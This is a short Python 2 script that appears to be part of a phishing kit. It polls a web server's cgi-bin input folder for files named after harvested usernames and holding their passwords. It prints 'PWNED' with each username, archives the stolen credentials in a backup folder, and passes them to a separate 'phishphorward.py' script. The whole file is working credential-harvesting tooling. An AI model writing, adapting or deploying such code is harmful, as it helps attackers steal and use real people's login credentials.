#!/usr/bin/python
import os, sys
import glob
import time
import datetime
import subprocess

def watch():
    file_list = glob.glob('/var/www/html/cgi-bin/input/*') #this is the directory to watch
    global latest_file
    latest_file = max(file_list, key=os.path.getctime)

watchlist = []

while True:
    time.sleep(5)
    try:
        watch()
        
        watchlist.append(latest_file)
        username = os.path.basename(latest_file) 
        f = open(latest_file,"r")
        password = f.read()
        print "PWNED " + username
        timestamp = time.time()
        backup = "/var/www/html/cgi-bin/credbackup/" + username +"time" + str(timestamp) #this is where the creds get moved to once used
        os.rename(latest_file, backup)            
        subprocess.Popen(['python2.7','/var/www/html/cgi-bin/phishphorward.py', username, password]) #update path to phishphorward if not here
    except:
        print "No new users"
